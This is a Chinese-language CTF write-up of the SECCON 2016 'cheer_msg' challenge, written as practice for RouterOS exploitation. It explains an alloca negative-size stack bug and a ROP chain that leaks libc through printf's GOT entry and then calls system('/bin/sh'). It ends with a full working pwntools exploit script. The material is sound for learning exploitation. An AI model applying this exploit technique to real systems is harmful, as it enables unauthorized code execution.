---
title: 一步一步 Pwn RouterOS之ctf题练手
authorId: hac425
tags:
  - alloca
  - ctf
categories:
  - pwn_router_os
date: 2018-01-05 21:38:00
---
### 前言


---
本文由 **本人** 首发于 先知安全技术社区：  https://xianzhi.aliyun.com/forum/user/5274

---


本文目的是以一道比较简单的 `ctf` 的练手，为后面的分析  `RouterOs` 的 漏洞和写 `exploit` 打基础。

`Seccon CTF quals 2016` 的一道题。

题目，idb 文件：

https://gitee.com/hac425/blog_data/tree/master/pwn_with_alloca


### 正文
首先看看 `main` 函数的代码。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/15151601513002tz99qyj.png?imageslim)

逻辑还是比较简单的获取输入后，简单的加了 `30` 就给 `alloca` 去分配空间，然后进入 `message` 函数。

`alloca` 函数是 从 栈上分配内存， 它分配内存是通过 `sub esp , *` 来实现的，我们可以转到汇编代码看看。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515160871164u36cvqez.png?imageslim)

可以看到调用 `alloca` 实际就是通过 `sub esp, eax` 来分配栈内存。

我们输入的 `num` 是 `int` 类型的

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515161037092srnu0pi2.png?imageslim)

如果我们输入 `num` 为 负数， `sub esp` 就相当于 `add esp` 我们可以把栈指针往栈底移动。

继续往下看

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515161251064vsu5zpke.png?imageslim)

接下来会调用 `message` 函数， 可以看到传给他的参数为 `esp + 23` 和 `num` ， 进入 `message` 函数 ，看看他的逻辑。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515161389377ru08eqe3.png?imageslim)
首先读取 `n` 个字符 到 `buf` ， 这两个变量就是我们传入的参数。

然后读入 `0x40` 个字符到  `message` 函数自己定义的局部变量中。

一切都很正常，没有溢出，没有格式化字符串漏洞。


程序的漏洞在于传入的 `buf` 是通过 `alloca` 分配的内存，我们可以通过输入 负数 使得 `alloca`的参数为负， 这样我们就可以把 `esp` 往栈底移动，栈底有**返回地址**, 然后通过 `message`  中读取数据，覆盖 `eip` 然后进行 `rop` 即可。

要触发漏洞我们需要输入负数，所以在 

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515162118968n3v5nlzd.png?imageslim)
会直接返回，不会获取输入，因为它里面调用的是 `fgets`来获取输入。`fgets`会有检查。
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515162247314nycp4hlw.png?imageslim)

所以我们只能往 `message` 函数内的缓冲区 `t_buf`写数据，不过这个缓冲区也是在栈上，同样与 `esp` 相关，所以我们把`esp` 往栈底移时，它也是会跟着下移，通过它也可以写 `返回地址` 的值。

我们可以输入 `-140`(这个值可以通过 先输入一个 比较小的比如 `-32`, 然后计算最后得到的数据的地址距离返回地址位置的距离，来继续调整)

在 `0x0804860E` 设个断点

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515164055082ht6doej3.png?imageslim)

`sub` 之后
![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515164096301tgle7wih.png?imageslim)

可以看到 `esp` 已经增大。
然后加上一定的 `padding` (可以使用 `pwntools` 的 `cyclic` 计算) ，就能修改 返回地址了。

![paste image](http://oy9h5q2k4.bkt.clouddn.com/1515164574183kx3lzgi2.png?imageslim)

之后就是正常的 `rop`

-----------

使用 `printf` 打印 `got` 表中的 `printf` 的值，泄露 `libc` 的地址。然后回到程序的开始，再次触发漏洞， 调用 `system("sh")`

----------


### 总结

`alloca` 的细节要注意， 注意输入的数据是有符号的还是无符号的。对于后面计算偏移，可以先动态调试计算一个粗略的值，然后使用 `cyclic` 确定精确的偏移。


**exp**

```
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-v']
r = process("./cheer_msg")

binary = ELF('cheer_msg')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')

gdb.attach(r, '''
bp 0x0804868B
bp 0x08048610
	''')

r.recvuntil("Length >> ")
r.sendline("-140")
r.recvuntil("Name >> ")

payload = "a" * 0x10 # padding
payload += p32(binary.symbols['printf'])
payload += p32(binary.entry)  # ret to start
payload += p32(binary.got['printf'])

r.sendline(payload)

r.recvuntil("Message :")
r.recv(1)
r.recv(1)
printf_addr = u32(r.recv(4))
libc_base = printf_addr - libc.symbols['printf']
sh = libc_base + libc.search("/bin/sh\x00").next()
system = libc_base + libc.symbols['system']

log.info("got system: " + hex(system))
log.info("got base: " + hex(libc_base))
log.info("get sh " + hex(sh))



r.recvuntil("Length >> ")
r.sendline("-140")
r.recvuntil("Name >> ")

payload = "a" * 0x10 # padding
payload += p32(system)
payload += p32(binary.entry)
payload += p32(sh)
r.sendline(payload)

r.interactive()

```



参考：

https://github.com/0x90r00t/Write-Ups/tree/master/Seccon/cheer_msg